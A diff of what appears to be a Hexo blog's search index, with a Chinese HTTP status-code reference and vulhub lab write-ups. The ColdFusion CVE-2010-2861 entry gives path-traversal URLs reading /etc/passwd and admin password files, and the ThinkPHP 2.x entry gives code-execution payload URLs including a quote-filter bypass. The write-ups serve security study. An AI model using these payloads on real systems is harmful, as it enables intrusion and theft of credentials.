-<td align="left">服务器已接受请求，但尚未处理。正如它可能被拒绝一样，最终该请求可能会也可能不会被执行。在异步操作的场合下，没有比发送这个状态码更方便的做法了。:返回202状态码的响应的目的是允许服务器接受其他过程的请求（例如某个每天只执行一次的基于批处理的操作），而不必让客户端一直保持与服务器的连接直到批处理操作全部完成。在接受请求处理并返回202状态码的响应应当在返回的实体中包含一些指示处理当前状态的信息，以及指向处理状态监视器或状态预测的指针，以便用户能够估计操作是否已经完成。</td>
-<td align="left">HTTP&#x2F;0.9 可用</td>
-</tr>
-<tr>
-<td align="center">203</td>
-<td align="left">Non-Authoritative Information (未授权信息)</td>
-<td align="left">服务器已成功处理了请求,但返回的实体头部元信息不是在原始服务器上有效的确定集合，而是来自本地或者第三方的拷贝,如果不是上述情况,使用200状态码才是最合适的.</td>
-<td align="left">HTTP&#x2F;0.9 and 1.1</td>
-</tr>
-<tr>
-<td align="center">204</td>
-<td align="left">No Content (无内容)</td>
-<td align="left">该响应没有响应内容,只有响应头,响应头也可能是有用的.用户代理可以根据新的响应头来更新对应资源的缓存信息.</td>
-<td align="left">HTTP&#x2F;0.9 可用</td>
-</tr>
-<tr>
-<td align="center">205</td>
-<td align="left">Reset Content (重置内容)</td>
-<td align="left">告诉用户代理去重置发送该请求的窗口的文档视图.</td>
-<td align="left">HTTP&#x2F;1.1 可用</td>
-</tr>
-<tr>
-<td align="center">206</td>
-<td align="left">Partial Content (部分内容)</td>
-<td align="left">当客户端通过使用range头字段进行文件分段下载时使用该状态码</td>
-<td align="left">HTTP&#x2F;1.1 可用</td>
-</tr>
-<tr>
-<td align="center">重定向</td>
-<td align="left"></td>
-<td align="left"></td>
-<td align="left"></td>
-</tr>
-<tr>
-<td align="center">300</td>
-<td align="left">Multiple Choice (多种选择)</td>
-<td align="left">该请求有多种可能的响应,用户代理或者用户必须选择它们其中的一个.服务器没有任何标准可以遵循去代替用户来进行选择.</td>
-<td align="left">HTTP&#x2F;1.0 and later</td>
-</tr>
-<tr>
-<td align="center">301</td>
-<td align="left">Moved Permanently (永久移动)</td>
-<td align="left">该状态码表示所请求的URI资源路径已经改变,新的URL会在响应的<code>Location</code>:头字段里找到.</td>
-<td align="left">HTTP&#x2F;0.9 可用</td>
-</tr>
-<tr>
-<td align="center">302</td>
-<td align="left">Found (临时移动)</td>
-<td align="left">该状态码表示所请求的URI资源路径临时改变,并且还可能继续改变.因此客户端在以后访问时还得继续使用该URI.新的URL会在响应的<code>Location:</code>头字段里找到.</td>
-<td align="left">HTTP&#x2F;0.9 可用</td>
-</tr>
-<tr>
-<td align="center">303</td>
-<td align="left">See Other (查看其他位置)</td>
-<td align="left">服务器发送该响应用来引导客户端使用GET方法访问另外一个URI.</td>
-<td align="left">HTTP&#x2F;0.9 and 1.1</td>
-</tr>
-<tr>
-<td align="center">304</td>
-<td align="left">Not Modified (未修改)</td>
-<td align="left">告诉客户端,所请求的内容距离上次访问并没有变化. 客户端可以直接从浏览器缓存里获取该资源.</td>
-<td align="left">HTTP&#x2F;0.9 可用</td>
-</tr>
-<tr>
-<td align="center">305</td>
-<td align="left">Use Proxy (使用代理)</td>
-<td align="left">所请求的资源必须统过代理才能访问到.由于安全原因,该状态码并未受到广泛支持.</td>
-<td align="left">HTTP&#x2F;1.1 可用</td>
-</tr>
-<tr>
-<td align="center">306</td>
-<td align="left"><em>unused</em> (未使用)</td>
-<td align="left">这个状态码已经不再被使用,当初它被用在HTTP 1.1规范的旧版本中.</td>
-<td align="left">HTTP&#x2F;1.1 可用</td>
-</tr>
-<tr>
-<td align="center">307</td>
-<td align="left">Temporary Redirect (临时重定向)</td>
-<td align="left">服务器发送该响应用来引导客户端使用相同的方法访问另外一个URI来获取想要获取的资源.新的URL会在响应的<code>Location:</code>头字段里找到.与302状态码有相同的语义,且前后两次访问必须使用相同的方法(GET POST).</td>
-<td align="left">HTTP&#x2F;1.1 可用</td>
-</tr>
-<tr>
-<td align="center">308</td>
-<td align="left">Permanent Redirect (永久重定向)</td>
-<td align="left">所请求的资源将永久的位于另外一个URI上.新的URL会在响应的<code>Location:</code>头字段里找到.与301状态码有相同的语义,且前后两次访问必须使用相同的方法(GET POST).</td>
-<td align="left">HTTPbis (试验草案)</td>
-</tr>
-<tr>
-<td align="center">客户端错误</td>
-<td align="left"></td>
-<td align="left"></td>
-<td align="left"></td>
-</tr>
-<tr>
-<td align="center">400</td>
-<td align="left">Bad Request (错误请求)</td>
-<td align="left">因发送的请求语法错误,服务器无法正常读取.</td>
-<td align="left">HTTP&#x2F;0.9 可用</td>
-</tr>
-<tr>
-<td align="center">401</td>
-<td align="left">Unauthorized (未授权)</td>
-<td align="left">需要身份验证后才能获取所请求的内容,类似于403错误.不同点是.401错误后,只要正确输入帐号密码,验证即可通过.</td>
-<td align="left">HTTP&#x2F;0.9 可用</td>
-</tr>
-<tr>
-<td align="center">402</td>
-<td align="left">Payment Required (需要付款)</td>
-<td align="left">该状态码被保留以供将来使用.创建此代码最初的目的是为数字支付系统而用,然而,到现在也没投入使用.</td>
-<td align="left">HTTP&#x2F;0.9 and 1.1</td>
-</tr>
-<tr>
-<td align="center">403</td>
-<td align="left">Forbidden (禁止访问)</td>
-<td align="left">客户端没有权利访问所请求内容,服务器拒绝本次请求.</td>
-<td align="left">HTTP&#x2F;0.9 可用</td>
-</tr>
-<tr>
-<td align="center">404</td>
-<td align="left">Not Found (未找到)</td>
-<td align="left">服务器找不到所请求的资源.由于经常发生此种情况,所以该状态码在上网时是非常常见的.</td>
-<td align="left">HTTP&#x2F;0.9 可用</td>
-</tr>
-<tr>
-<td align="center">405</td>
-<td align="left">Method Not Allowed (不允许使用该方法)</td>
-<td align="left">该请求使用的方法被服务器端禁止使用,RFC2616中规定, <code>GET</code> 和 <code>HEAD</code> 方法不能被禁止.</td>
-<td align="left">HTTP&#x2F;1.1 可用</td>
-</tr>
-<tr>
-<td align="center">406</td>
-<td align="left">Not Acceptable (无法接受)</td>
-<td align="left">在进行服务器驱动内容协商后,没有发现合适的内容传回给客户端.</td>
-<td align="left">HTTP&#x2F;1.1 可用</td>
-</tr>
-<tr>
-<td align="center">407</td>
-<td align="left">Proxy Authentication Required (要求代理身份验证)</td>
-<td align="left">类似于状态码 401,不过需要通过代理才能进行验证.</td>
-<td align="left">HTTP&#x2F;1.1 可用</td>
-</tr>
-<tr>
-<td align="center">408</td>
-<td align="left">Request Timeout (请求超时)</td>
-<td align="left">客户端没有在服务器预备等待的时间内完成一个请求的发送.这意味着服务器将会切断和客户端的连接. 在其他浏览器中,这种响应更常见一些, 例如Chrome 和 IE9, 目的是为了使用HTTP 预连机制加快浏览速度. 同时注意,一些服务器不发送此种响应就直接切断连接.</td>
-<td align="left">HTTP&#x2F;1.1 可用</td>
-</tr>
-<tr>
-<td align="center">409</td>
-<td align="left">Conflict (冲突)</td>
-<td align="left">该请求与服务器的当前状态所冲突.</td>
-<td align="left">HTTP&#x2F;1.1 可用</td>
-</tr>
-<tr>
-<td align="center">410</td>
-<td align="left">Gone (已失效)</td>
-<td align="left">所请求的资源已经被删除.</td>
-<td align="left">HTTP&#x2F;1.1 可用</td>
-</tr>
-<tr>
-<td align="center">411</td>
-<td align="left">Length Required (需要内容长度头)</td>
-<td align="left">因服务器在本次请求中需要 <code>Content-Length</code> 头字段,而客户端没有发送.所以,服务器拒绝了该请求.</td>
-<td align="left">HTTP&#x2F;1.1 可用</td>
-</tr>
-<tr>
-<td align="center">412</td>
-<td align="left">Precondition Failed (预处理失败)</td>
-<td align="left">服务器没能满足客户端在获取资源时在请求头字段中设置的先决条件.</td>
-<td align="left">HTTP&#x2F;1.1 可用</td>
-</tr>
-<tr>
-<td align="center">413</td>
-<td align="left">Request Entity Too Large (请求实体过长)</td>
-<td align="left">请求实体大小超过服务器的设置的最大限制,服务器可能会关闭HTTP链接并返回<code>Retry-After</code> 头字段.</td>
-<td align="left">HTTP&#x2F;1.1 可用</td>
-</tr>
-<tr>
-<td align="center">414</td>
-<td align="left">Request-URI Too Long (请求网址过长)</td>
-<td align="left">客户端请求所包含的URI地址太长,以至于服务器无法处理.</td>
-<td align="left">HTTP&#x2F;1.1 可用</td>
-</tr>
-<tr>
-<td align="center">415</td>
-<td align="left">Unsupported Media Type (媒体类型不支持)</td>
-<td align="left">服务器不支持客户端所请求的媒体类型,因此拒绝该请求.</td>
-<td align="left">HTTP&#x2F;1.1 可用</td>
-</tr>
-<tr>
-<td align="center">416</td>
-<td align="left">Requested Range Not Satisfiable (请求范围不合要求)</td>
-<td align="left">请求中包含的<code>Range</code>头字段无法被满足,通常是因为<code>Range</code>中的数字范围超出所请求资源的大小.</td>
-<td align="left">HTTP&#x2F;1.1 可用</td>
-</tr>
-<tr>
-<td align="center">417</td>
-<td align="left">Expectation Failed (预期结果失败)</td>
-<td align="left">在请求头<code> Expect</code> 中指定的预期内容无法被服务器满足.</td>
-<td align="left">HTTP&#x2F;1.1 可用</td>
-</tr>
-<tr>
-<td align="center">418</td>
-<td align="left">I’m a teapot (服务端拒绝用茶壶煮咖啡)</td>
-<td align="left">超文本咖啡壶控制协议（英语：Hyper Text Coffee Pot Control Protocol，缩写HTCPCP）是由IETF虚构的一种协议。这个协议在文档RFC 2324（1998年4月1日发布）中定义，是一个恶搞RFC。 该协议被设计为一个类似HTTP的协议，可以用于控制、监测和诊断咖啡壶，后来也被拓展到茶壶；该协议有时也可以视作一种早期的物联网实验。</td>
-<td align="left">HTCPCP 可用</td>
-</tr>
-<tr>
-<td align="center">服务器端错误</td>
-<td align="left"></td>
-<td align="left"></td>
-<td align="left"></td>
-</tr>
-<tr>
-<td align="center">500</td>
-<td align="left">Internal Server Error (内部服务器错误)</td>
-<td align="left">服务器遇到未知的无法解决的问题.</td>
-<td align="left">HTTP&#x2F;0.9 可用</td>
-</tr>
-<tr>
-<td align="center">501</td>
-<td align="left">Not Implemented (未实现)</td>
-<td align="left">服务器不支持该请求中使用的方法,比如<code>POST</code> 和 <code>PUT.只有``GET</code> 和 <code>HEAD</code> 是RFC2616规范中规定服务器必须实现的方法.</td>
-<td align="left">HTTP&#x2F;0.9 可用</td>
-</tr>
-<tr>
-<td align="center">502</td>
-<td align="left">Bad Gateway (网关错误)</td>
-<td align="left">服务器作为网关且从上游服务器获取到了一个无效的HTTP响应.</td>
-<td align="left">HTTP&#x2F;0.9 可用</td>
-</tr>
-<tr>
-<td align="center">503</td>
-<td align="left">Service Unavailable (服务不可用)</td>
-<td align="left">由于临时的服务器维护或者过载,服务器当前无法处理请求.这个状况是临时的,并且将在一段时间以后恢复.如果能够预计延迟时间,那么响应中可以包含一个<code>Retry-After:</code>头用以标明这个延迟时间.如果没有给出这个<code>Retry-After:</code>信息，那么客户端应当以处理500响应的方式处理它.同时,这种情况下,一个友好的用于解释服务器出现问题的页面应当被返回,并且,缓存相关的HTTP头信息也应该包含,因为通常这种错误提示网页不应当被客户端缓存.</td>
-<td align="left">HTTP&#x2F;0.9 可用</td>
-</tr>
-<tr>
-<td align="center">504</td>
-<td align="left">Gateway Timeout (网关超时)</td>
-<td align="left">服务器作为网关且不能从上游服务器及时的得到响应返回给客户端.</td>
-<td align="left">HTTP&#x2F;1.1 可用</td>
-</tr>
-<tr>
-<td align="center">505</td>
-<td align="left">HTTP Version Not Supported (HTTP版本不受支持)</td>
-<td align="left">服务器不支持客户端发送的HTTP请求中所使用的HTTP协议版本.</td>
-<td align="left">HTTP&#x2F;1.1 可用</td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>杂项</category>
-      </categories>
-      <tags>
-        <tag>Http</tag>
-        <tag>状态码</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>OpenTSDB 命令注入漏洞（CVE-2020-35476）</title>
     <url>/2023/11/11/OpenTSDB-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-35476%EF%BC%89/</url>
     <content><![CDATA[<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p><strong>漏洞环境：OpenTSDB 命令注入漏洞（CVE-2020-35476）</strong></p>
@@ -667,6 +80,47 @@
 
 <p>再打开刚刚的cmd窗口，可以看到成功反弹Shell，输入ls查看文件列表</p>
 <img src="https://images.gaifagafin.top/202311112123847.png" style="zoom:67%;" />
+]]></content>
+      <categories>
+        <category>vulhub</category>
+      </categories>
+      <tags>
+        <tag>vulhub</tag>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</title>
+    <url>/2023/11/11/Adobe-ColdFusion-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2010-2861%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p><strong>漏洞环境：Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</strong></p>
+<ol>
+<li>复现环境中的任意文件读取漏洞，截图证明</li>
+<li>尝试利用漏洞读取目标系统中的”&#x2F;opt&#x2F;coldfusion8&#x2F;license.txt”文件，提供截图</li>
+</ol>
+<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>执行如下命令启动Adobe CouldFusion 8.0.1版本服务器：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker-compose up -d<br></code></pre></td></tr></table></figure>
+
+<p>启动后，访问</p>
+<p><code>http://your-ip:8500/CFIDE/administrator/enter.cfm</code></p>
+<p>可以看到初始化页面，输入密码<code>admin</code>，最后点击ok，开始初始化整个环境。</p>
+<img src="https://images.gaifagafin.top/202311112129162.png" style="zoom:67%;" />
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用另外一个浏览器直接访问</p>
+<p><code>http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en</code></p>
+<p>即可读取文件<code>/etc/passwd</code></p>
+<p>我这里在浏览器访问：</p>
+<p><a href="http://192.168.52.130:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en">http://192.168.52.130:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en</a></p>
+<img src="https://images.gaifagafin.top/202311112129495.png" style="zoom:67%;" />
+
+<p>读取后台管理员密码</p>
+<p><code>http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en</code></p>
+<img src="https://images.gaifagafin.top/202311112129747.png" style="zoom:67%;" />
+
+<h2 id="读取license-txt文件"><a href="#读取license-txt文件" class="headerlink" title="读取license.txt文件"></a>读取license.txt文件</h2><p>根据上面的漏洞复现，构造出payload：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://192.168.52.130:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../license.txt%00en<br></code></pre></td></tr></table></figure>
+
+<p>浏览器输入payload得到license.txt</p>
+<img src="https://images.gaifagafin.top/202311112129711.png" style="zoom:67%;" />
 ]]></content>
       <categories>
         <category>vulhub</category>
@@ -1228,6 +682,491 @@
       </tags>
   </entry>
   <entry>
+    <title>ThinkPHP 2.x 任意代码执行漏洞</title>
+    <url>/2023/11/11/ThinkPHP-2-x-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p><strong>漏洞环境：ThinkPHP 2.x 任意代码执行漏洞</strong></p>
+<ol>
+<li>复现环境中的代码执行漏洞，截图证明</li>
+<li>尝试利用代码执行漏洞读取服务器Web目录下的文件列表，提供截图</li>
+</ol>
+<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>进入<code>/vulhub/thinkphp/2-rce</code>目录下，终端输入<code>docker-compose up -d</code>开启靶场容器，这里我将虚拟机5006端口映射到容器80端口，浏览器访问5006端口</p>
+<img src="https://images.gaifagafin.top/202311112126159.png" style="zoom:67%;" />
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问<code>http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D</code></p>
+<p>即可执行<code>phpinfo()</code></p>
+<img src="https://images.gaifagafin.top/202311112126268.png" style="zoom:67%;" />
+
+<h2 id="读取服务器Web目录下的文件列表"><a href="#读取服务器Web目录下的文件列表" class="headerlink" title="读取服务器Web目录下的文件列表"></a>读取服务器Web目录下的文件列表</h2><p>根据上面漏洞复现，要想读取文件列表，首先想到system()函数，于是构造<code>http://192.168.52.130:5006/index.php?s=%2findex%2findex%2fname%2f$%7B@system(%22ls%22)%7D</code></p>
+<p>但是这里单引号双引号都被过滤了</p>
+<img src="https://images.gaifagafin.top/202311112126372.png" style="zoom:67%;" />
+
+<p>这是时想到PHP还有<code>var_dump()</code>函数，并且反引号似乎不会被过滤，于是构造payload：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://192.168.52.130:5006/index.php?s=/index/index/name/$%7B@var_dump(%60ls%60)%7D%20<br></code></pre></td></tr></table></figure>
+
+<p>得到文件列表</p>
+<p><img src="https://images.gaifagafin.top/202311112126522.png"></p>
+<p>进入容器验证</p>
+<img src="https://images.gaifagafin.top/202311112126245.png" style="zoom: 80%;" />
+]]></content>
+      <categories>
+        <category>vulhub</category>
+      </categories>
+      <tags>
+        <tag>vulhub</tag>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Http状态码详解</title>
+    <url>/2023/11/04/Http%E7%8A%B6%E6%80%81%E7%A0%81%E8%AF%A6%E8%A7%A3/</url>
+    <content><![CDATA[<h1 id="Http状态码详解"><a href="#Http状态码详解" class="headerlink" title="Http状态码详解"></a>Http状态码详解</h1><p>转载自:<a href="https://config.net.cn/tools/HttpStatusCode.html">https://config.net.cn/tools/HttpStatusCode.html</a></p>
+<ul>
+<li>http状态码的核心作用是Web Server服务器用来告诉客户端，当前的网页请求发生了什么事，或者说当前Web服务器的响应状态</li>
+<li>HTTP 状态码由三个十进制数字组成，第一个十进制数字定义了状态码的类型。响应分为五类：信息响应(100–199)，成功响应(200–299)，重定向(300–399)，客户端错误(400–499)和服务器错误 (500–599)</li>
+<li>扩展资料– <a href="https://developer.mozilla.org/zh-CN/docs/web/http/overview">Http概述</a>  | <a href="https://learn.microsoft.com/zh-cn/dotnet/api/system.net.httpstatuscode?view=net-6.0">HttpStatusCode 枚举</a> , <a href="https://developer.mozilla.org/zh-CN/docs/web/http/methods">Http Request Method</a>, <a href="https://config.net.cn/tools/HttpContentType.html">Http Content-Type大全</a>,  <a href="https://config.net.cn/tools/HttpRequestHeader.html">Http Request请求头大全</a>, <a href="https://config.net.cn/tools/HttpResponseHeader.html">Http Response请求头大全</a> , <a href="https://config.net.cn/tools/UserAgent.html">浏览器UserAgent大全</a></li>
+</ul>
+<blockquote>
+<p>以下是<strong>HTTP 状态码详解大全 | HTTP Status Codes”</strong> ，来自维基百科，可以按<code>Ctrl+F</code>快速查找需要的信息</p>
+</blockquote>
+<h2 id="1xx消息"><a href="#1xx消息" class="headerlink" title="1xx消息"></a>1xx消息</h2><p>这一类型的状态码，代表请求已被接受，需要继续处理。这类响应是临时响应，只包含状态行和某些可选的响应头信息，并以空行结束。由于HTTP&#x2F;1.0协议中没有定义任何1xx状态码，所以除非在某些试验条件下，服务器禁止向此类客户端发送1xx响应。[4] 这些状态码代表的响应都是信息性的，标示客户应该采取的其他行动。</p>
+<h3 id="100-Continue"><a href="#100-Continue" class="headerlink" title="100 Continue"></a>100 Continue</h3><p>服务器已经接收到请求头，并且客户端应继续发送请求主体（在需要发送身体的请求的情况下：例如，POST请求），或者如果请求已经完成，忽略这个响应。服务器必须在请求完成后向客户端发送一个最终响应。要使服务器检查请求的头部，客户端必须在其初始请求中发送Expect: 100-continue作为头部，并在发送正文之前接收100 Continue状态代码。响应代码417期望失败表示请求不应继续。[2]</p>
+<h3 id="101-Switching-Protocols"><a href="#101-Switching-Protocols" class="headerlink" title="101 Switching Protocols"></a>101 Switching Protocols</h3><p>服务器已经理解了客户端的请求，并将通过Upgrade消息头通知客户端采用不同的协议来完成这个请求。在发送完这个响应最后的空行后，服务器将会切换到在Upgrade消息头中定义的那些协议。[5] 只有在切换新的协议更有好处的时候才应该采取类似措施。例如，切换到新的HTTP版本（如HTTP&#x2F;2）比旧版本更有优势，或者切换到一个实时且同步的协议（如WebSocket）以传送利用此类特性的资源。</p>
+<h3 id="102-Processing"><a href="#102-Processing" class="headerlink" title="102 Processing"></a>102 Processing</h3><p>WebDAV请求可能包含许多涉及文件操作的子请求，需要很长时间才能完成请求。该代码表示服务器已经收到并正在处理请求，但无响应可用。[6]这样可以防止客户端超时，并假设请求丢失。</p>
+<h2 id="2xx成功"><a href="#2xx成功" class="headerlink" title="2xx成功"></a>2xx成功</h2><p>这一类型的状态码，代表请求已成功被服务器接收、理解、并接受。[2]</p>
+<h3 id="200-OK"><a href="#200-OK" class="headerlink" title="200 OK"></a>200 OK</h3><p>请求已成功，请求所希望的响应头或数据体将随此响应返回。实际的响应将取决于所使用的请求方法。在GET请求中，响应将包含与请求的资源相对应的实体。在POST请求中，响应将包含描述或操作结果的实体。[7]</p>
+<h3 id="201-Created"><a href="#201-Created" class="headerlink" title="201 Created"></a>201 Created</h3><p>请求已经被实现，而且有一个新的资源已经依据请求的需要而建立，且其URI已经随Location头信息返回。假如需要的资源无法及时创建的话，应当返回’202 Accepted’。[8]</p>
+<h3 id="202-Accepted"><a href="#202-Accepted" class="headerlink" title="202 Accepted"></a>202 Accepted</h3><p>服务器已接受请求，但尚未处理。最终该请求可能会也可能不会被执行，并且可能在处理发生时被禁止。[9]</p>
+<h3 id="203-Non-Authoritative-Information"><a href="#203-Non-Authoritative-Information" class="headerlink" title="203 Non-Authoritative Information"></a>203 Non-Authoritative Information</h3><p>服务器是一个转换代理服务器（transforming proxy，例如网络加速器），以200 OK状态码为起源，但回应了原始响应的修改版本。[10][11]</p>
+<h3 id="204-No-Content"><a href="#204-No-Content" class="headerlink" title="204 No Content"></a>204 No Content</h3><p>服务器成功处理了请求，没有返回任何内容。[12]</p>
+<h3 id="205-Reset-Content"><a href="#205-Reset-Content" class="headerlink" title="205 Reset Content"></a>205 Reset Content</h3><p>服务器成功处理了请求，但没有返回任何内容。与204响应不同，此响应要求请求者重置文档视图。[13]</p>
+<h3 id="206-Partial-Content"><a href="#206-Partial-Content" class="headerlink" title="206 Partial Content"></a>206 Partial Content</h3><p>服务器已经成功处理了部分GET请求。类似于FlashGet或者迅雷这类的HTTP 下载工具都是使用此类响应实现断点续传或者将一个大文档分解为多个下载段同时下载。[14]</p>
+<h3 id="207-Multi-Status"><a href="#207-Multi-Status" class="headerlink" title="207 Multi-Status"></a>207 Multi-Status</h3><p>代表之后的消息体将是一个XML消息，并且可能依照之前子请求数量的不同，包含一系列独立的响应代码。[15]</p>
+<h3 id="208-Already-Reported"><a href="#208-Already-Reported" class="headerlink" title="208 Already Reported"></a>208 Already Reported</h3><p>DAV绑定的成员已经在（多状态）响应之前的部分被列举，且未被再次包含。</p>
+<h3 id="226-IM-Used"><a href="#226-IM-Used" class="headerlink" title="226 IM Used"></a>226 IM Used</h3><p>服务器已经满足了对资源的请求，对实体请求的一个或多个实体操作的结果表示。[16]</p>
+<h2 id="3xx重定向"><a href="#3xx重定向" class="headerlink" title="3xx重定向"></a>3xx重定向</h2><p>这类状态码代表需要客户端采取进一步的操作才能完成请求。通常，这些状态码用来重定向，后续的请求地址（重定向目标）在本次响应的Location域中指明。[2]</p>
+<p>当且仅当后续的请求所使用的方法是GET或者HEAD时，用户浏览器才可以在没有用户介入的情况下自动提交所需要的后续请求。客户端应当自动监测无限循环重定向（例如：A→B→C→……→A或A→A），因为这会导致服务器和客户端大量不必要的资源消耗。按照HTTP&#x2F;1.0版规范的建议，浏览器不应自动访问超过5次的重定向。[17]</p>
+<h3 id="300-Multiple-Choices"><a href="#300-Multiple-Choices" class="headerlink" title="300 Multiple Choices"></a>300 Multiple Choices</h3><p>被请求的资源有一系列可供选择的回馈信息，每个都有自己特定的地址和浏览器驱动的商议信息。用户或浏览器能够自行选择一个首选的地址进行重定向。[18] 除非这是一个HEAD请求，否则该响应应当包括一个资源特性及地址的列表的实体，以便用户或浏览器从中选择最合适的重定向地址。这个实体的格式由Content-Type定义的格式所决定。浏览器可能根据响应的格式以及浏览器自身能力，自动作出最合适的选择。当然，RFC 2616规范并没有规定这样的自动选择该如何进行。 如果服务器本身已经有了首选的回馈选择，那么在Location中应当指明这个回馈的URI；浏览器可能会将这个Location值作为自动重定向的地址。此外，除非额外指定，否则这个响应也是可缓存的。</p>
+<h3 id="301-Moved-Permanently"><a href="#301-Moved-Permanently" class="headerlink" title="301 Moved Permanently"></a>301 Moved Permanently</h3><p>被请求的资源已永久移动到新位置，并且将来任何对此资源的引用都应该使用本响应返回的若干个URI之一。如果可能，拥有链接编辑功能的客户端应当自动把请求的地址修改为从服务器反馈回来的地址。[19]除非额外指定，否则这个响应也是可缓存的。 新的永久性的URI应当在响应的Location域中返回。除非这是一个HEAD请求，否则响应的实体中应当包含指向新的URI的超链接及简短说明。 如果这不是一个GET或者HEAD请求，那么浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。 注意：对于某些使用HTTP&#x2F;1.0协议的浏览器，当它们发送的POST请求得到了一个301响应的话，接下来的重定向请求将会变成GET方式。</p>
+<h3 id="302-Found"><a href="#302-Found" class="headerlink" title="302 Found"></a>302 Found</h3><p>要求客户端执行临时重定向（原始描述短语为“Moved Temporarily”）。[20]由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求。只有在Cache-Control或Expires中进行了指定的情况下，这个响应才是可缓存的。 新的临时性的URI应当在响应的Location域中返回。除非这是一个HEAD请求，否则响应的实体中应当包含指向新的URI的超链接及简短说明。 如果这不是一个GET或者HEAD请求，那么浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。 注意：虽然RFC 1945和RFC 2068规范不允许客户端在重定向时改变请求的方法，但是很多现存的浏览器将302响应视作为303响应，并且使用GET方式访问在Location中规定的URI，而无视原先请求的方法。[21]因此状态码303和307被添加了进来，用以明确服务器期待客户端进行何种反应。[22]</p>
+<h3 id="303-See-Other"><a href="#303-See-Other" class="headerlink" title="303 See Other"></a>303 See Other</h3><p>对应当前请求的响应可以在另一个URI上被找到，当响应于POST（或PUT &#x2F; DELETE）接收到响应时，客户端应该假定服务器已经收到数据，并且应该使用单独的GET消息发出重定向。[23]这个方法的存在主要是为了允许由脚本激活的POST请求输出重定向到一个新的资源。这个新的URI不是原始资源的替代引用。同时，303响应禁止被缓存。当然，第二个请求（重定向）可能被缓存。 新的URI应当在响应的Location域中返回。除非这是一个HEAD请求，否则响应的实体中应当包含指向新的URI的超链接及简短说明。 注意：许多HTTP&#x2F;1.1版以前的浏览器不能正确理解303状态。如果需要考虑与这些浏览器之间的互动，302状态码应该可以胜任，因为大多数的浏览器处理302响应时的方式恰恰就是上述规范要求客户端处理303响应时应当做的。</p>
+<h3 id="304-Not-Modified"><a href="#304-Not-Modified" class="headerlink" title="304 Not Modified"></a>304 Not Modified</h3><p>表示资源在由请求头中的If-Modified-Since或If-None-Match参数指定的这一版本之后，未曾被修改。在这种情况下，由于客户端仍然具有以前下载的副本，因此不需要重新传输资源。[24]</p>
+<h3 id="305-Use-Proxy"><a href="#305-Use-Proxy" class="headerlink" title="305 Use Proxy"></a>305 Use Proxy</h3><p>被请求的资源必须通过指定的代理才能被访问。Location域中将给出指定的代理所在的URI信息，接收者需要重复发送一个单独的请求，通过这个代理才能访问相应资源。只有原始服务器才能创建305响应。许多HTTP客户端（像是Mozilla[25]和Internet Explorer）都没有正确处理这种状态代码的响应，主要是出于安全考虑。[26] 注意：RFC 2068中没有明确305响应是为了重定向一个单独的请求，而且只能被原始服务器建立。忽视这些限制可能导致严重的安全后果。</p>
+<h3 id="306-Switch-Proxy"><a href="#306-Switch-Proxy" class="headerlink" title="306 Switch Proxy"></a>306 Switch Proxy</h3><p>在最新版的规范中，306状态码已经不再被使用。最初是指“后续请求应使用指定的代理”。[27]</p>
+<h3 id="307-Temporary-Redirect"><a href="#307-Temporary-Redirect" class="headerlink" title="307 Temporary Redirect"></a>307 Temporary Redirect</h3><p>在这种情况下，请求应该与另一个URI重复，但后续的请求应仍使用原始的URI。 与302相反，当重新发出原始请求时，不允许更改请求方法。 例如，应该使用另一个POST请求来重复POST请求。[28]</p>
+<h3 id="308-Permanent-Redirect"><a href="#308-Permanent-Redirect" class="headerlink" title="308 Permanent Redirect"></a>308 Permanent Redirect</h3><p>请求和所有将来的请求应该使用另一个URI重复。 307和308重复302和301的行为，但不允许HTTP方法更改。 例如，将表单提交给永久重定向的资源可能会顺利进行。[29]</p>
+<h2 id="4xx客户端错误"><a href="#4xx客户端错误" class="headerlink" title="4xx客户端错误"></a>4xx客户端错误</h2><p>这类的状态码代表了客户端看起来可能发生了错误，妨碍了服务器的处理。除非响应的是一个HEAD请求，否则服务器就应该返回一个解释当前错误状况的实体，以及这是临时的还是永久性的状况。这些状态码适用于任何请求方法。浏览器应当向用户显示任何包含在此类错误响应中的实体内容。[30]</p>
